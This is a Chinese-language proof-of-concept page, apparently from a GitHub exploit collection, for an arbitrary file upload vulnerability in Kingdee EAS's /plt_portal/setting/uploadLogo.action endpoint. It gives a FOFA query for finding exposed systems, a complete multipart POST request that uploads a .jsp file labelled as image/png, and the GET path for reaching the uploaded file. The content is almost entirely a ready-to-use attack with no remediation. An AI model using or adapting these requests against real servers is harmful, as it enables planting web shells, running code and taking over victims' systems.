
## 金蝶OA-EAS系统 uploadLogo.action 任意文件上传漏洞

金蝶 EAS 及 EAS Cloud 是金蝶软件公司推出的一套企业级应用软件套件，旨在帮助企业实现全面的管理和业务流程优化。金蝶 EAS 及 EAS Cloud 在 uploadLogo.action 存在文件上传漏洞，攻击者可以利用文件上传漏洞执行恶意代码、写入后门、读取敏感文件，从而可能导致服务器受到攻击并被控制。

## fofa
```
app="Kingdee-EAS"
```

## poc
```
POST /plt_portal/setting/uploadLogo.action HTTP/1.1
Host: 
User-Agent: Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
X-Forwarded-For: 
Content-Length: 632
Content-Type: multipart/form-data; boundary=04844569c7ca7d21a3ca115dca477d62

--04844569c7ca7d21a3ca115dca477d62
Content-Disposition: form-data; name="chooseLanguage_top"; filename="chooseLanguage_top"

ch
--04844569c7ca7d21a3ca115dca477d62
Content-Disposition: form-data; name="dataCenter"; filename="dataCenter"

xx
--04844569c7ca7d21a3ca115dca477d62
Content-Disposition: form-data; name="insId"; filename="insId"


--04844569c7ca7d21a3ca115dca477d62
Content-Disposition: form-data; name="type"; filename="type"

top
--04844569c7ca7d21a3ca115dca477d62
Content-Disposition: form-data; name="upload"; filename="test.jsp"
Content-Type: image/png

test
--04844569c7ca7d21a3ca115dca477d62--
```
![3c4d1cec26f6b03e1876b02c2f7029d9](https://github.com/wy876/POC/assets/139549762/d7a2b831-852c-4488-bcd0-f9967d0e32a4)

## 上传文件路径
```

GET /portal/res/file/upload/xxx.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
X-Forwarded-For:
```
![47f8b3b0cc61c63d9a0d2d2b54a602dc](https://github.com/wy876/POC/assets/139549762/8a80fc29-9d8e-4622-a465-3c3c423f1e57)
